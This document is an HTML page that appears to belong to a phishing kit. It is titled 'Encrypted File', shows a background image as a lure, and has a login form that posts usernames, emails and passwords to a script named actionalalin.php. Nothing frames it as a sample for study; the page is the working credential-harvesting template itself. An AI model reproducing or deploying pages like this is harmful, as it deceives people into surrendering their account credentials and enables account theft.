                             <html><head>
        <title>Encrypted File</title>
        <!-- ---- Links --- !-->
         <style type="text/css"></style></head>
    <body>
        <!-- --- Header ---- !-->
                <div class="logo">
               <img src="bettyimages/alalin.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          </div>
        <!-- --- Form Login --- !-->
        <div id="form" style="left:680px;height:200px;">
            <form action="actionalalin.php" method="post">
            <h2 style="position:absolute;right:20%;top:40px;COLOR:#FFFFFF;height:150px;">  ..</h2>
            <div id="header-border-div0"></div>
        <input type="user" name="user" placeholder="Username or Email" required="" style="position:absolute;left:841px;top:192px;width:254;height:37px;padding:10px;border-radius:0px;border: 1px solid #bdc4c9;">
        <input type="password" name="pass" placeholder="Password" required="" style="position:absolute;left:841px;top:239px;width:254;height:37px;padding:10px;border-radius:0px;border: 1px solid #bdc4c9;">
        <button type="submit" class="login-button button-primary" style="position:absolute;top:350px;left:841px;padding:8px;font-size:.875em;box-sizing:border-box;display:block;cursor:pointer;background: #4391e3;border: none;border-radius: 0px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:200;"">
            <div class="sign-in-text">Sign in</div>
            </button> 
            </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
</body></html> 